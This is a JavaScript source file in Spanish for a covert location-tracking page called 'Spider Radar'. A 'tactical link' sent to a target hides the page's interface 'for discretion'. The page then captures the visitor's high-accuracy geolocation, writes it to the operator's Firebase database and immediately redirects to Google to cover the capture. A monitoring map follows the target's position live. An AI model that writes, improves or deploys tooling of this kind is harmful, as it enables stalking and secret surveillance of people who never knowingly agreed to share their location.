import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

// CONFIGURACIÓN DE FIREBASE
const firebaseConfig = {
    apiKey: "TU_API_KEY",
    authDomain: "tu-proyecto.firebaseapp.com",
    projectId: "tu-proyecto",
    storageBucket: "tu-proyecto.appspot.com",
    messagingSenderId: "TU_MESSAGING_SENDER_ID",
    appId: "TU_APP_ID"
};

// Inicializar Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let map;
let marker;
let ubicacionObjetivo = null; // Guardará [lat, lng] del objetivo en tiempo real
const ubicacionPorDefecto = [14.3333, -90.6667]; 

// Icono personalizado de araña para el objetivo
const spiderIcon = L.divIcon({
    html: '<div style="font-size: 28px; line-height: 1; text-shadow: 0 0 5px rgba(0,0,0,0.8);">🕷️</div>',
    className: 'spider-marker',
    iconSize: [30, 30],
    iconAnchor: [15, 15]
});

const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('target');

document.addEventListener("DOMContentLoaded", function () {
    // ESCENARIO A: Si entra desde el enlace en el celular (?target=objetivo_principal)
    if (targetId) {
        // Ocultar consola táctil para discreción
        const consoleElem = document.querySelector('.console-container');
        if (consoleElem) consoleElem.style.display = 'none';

        capturarYSalir(targetId);
        return;
    }

    // ESCENARIO B: Consola de Monitoreo (PC / Tu pantalla)
    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    // Marcador inicial con icono de araña
    marker = L.marker(ubicacionPorDefecto, { icon: spiderIcon }).addTo(map)
        .bindPopup("<b>Spider Radar:</b> Esperando señal...")
        .openPopup();

    setTimeout(() => { map.invalidateSize(); }, 200);

    // Escuchar la base de datos de Firebase continuamente
    escucharObjetivoRemoto("objetivo_principal");
});

// CAPTURA SILENCIOSA Y REDIRECCIÓN INSTANTÁNEA EN EL CELULAR OBJETIVO
function capturarYSalir(id) {
    if (!navigator.geolocation) {
        window.location.replace("https://www.google.com");
        return;
    }

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            try {
                await setDoc(doc(db, "rastreos", id), {
                    lat: lat,
                    lng: lng,
                    timestamp: new Date()
                });
            } catch (e) {
                console.error("Error al enviar coordenadas:", e);
            } finally {
                // Sale inmediatamente a Google
                window.location.replace("https://www.google.com");
            }
        },
        (error) => {
            window.location.replace("https://www.google.com");
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );
}

// ESCUCHAR FIREBASE Y ACTUALIZAR COORDENADAS
function escucharObjetivoRemoto(id) {
    onSnapshot(doc(db, "rastreos", id), (docSnap) => {
        if (docSnap.exists()) {
            const data = docSnap.data();
            
            // Guardar la ubicación globalmente
            ubicacionObjetivo = [data.lat, data.lng];

            // Mover marcador e informar en banner
            marker.setLatLng(ubicacionObjetivo);
            marker.bindPopup(`<b>🕷️ Objetivo Spider Detectado</b><br>Lat: ${data.lat.toFixed(5)}<br>Lng: ${data.lng.toFixed(5)}`);

            const banner = document.getElementById('banner-status');
            if (banner) {
                banner.innerHTML = "OBJETIVO DETECTADO<br>UBICACIÓN ARAÑA LISTA";
            }
        }
    });
}

// BOTÓN "RASTREAR": Dirige el mapa a la ubicación araña capturada
window.accionRastrearObjetivo = function() {
    if (ubicacionObjetivo) {
        map.invalidateSize();
        map.setView(ubicacionObjetivo, 17, { animate: true }); // Zoom cercano e interactivo
        marker.openPopup();
    } else {
        alert("Aún no se ha recibido ninguna ubicación desde la señal de objetivo.");
    }
};

// BOTÓN SHARE LINK: Genera el enlace específico para la persona objetivo
window.compartirEnlace = function() {
    const enlaceObjetivo = "https://mmommo52.github.io/Spidey/?target=objetivo_principal";
    
    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
        alert("¡Enlace táctico copiado!\n\nEnviará: " + enlaceObjetivo);
    }).catch(err => {
        console.error("Error copiando enlace:", err);
    });
};

// OTRAS FUNCIONES DEL PANEL
window.obtenerUbicacionActual = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            map.setView([lat, lng], 16);
            L.marker([lat, lng]).addTo(map).bindPopup("Tu ubicación actual").openPopup();
        });
    }
};

window.centrarUbicacion = () => {
    if (ubicacionObjetivo) {
        map.setView(ubicacionObjetivo, 16);
    } else {
        map.invalidateSize();
    }
};

window.cambiarAlerta = (t) => alert("Alerta: " + t);
window.cambiarPerfil = (n) => alert("Perfil: " + n);
window.abrirChat = () => alert("Canal de chat seguro abierto.");
window.verArchivo = () => alert("Abriendo registros históricos...");
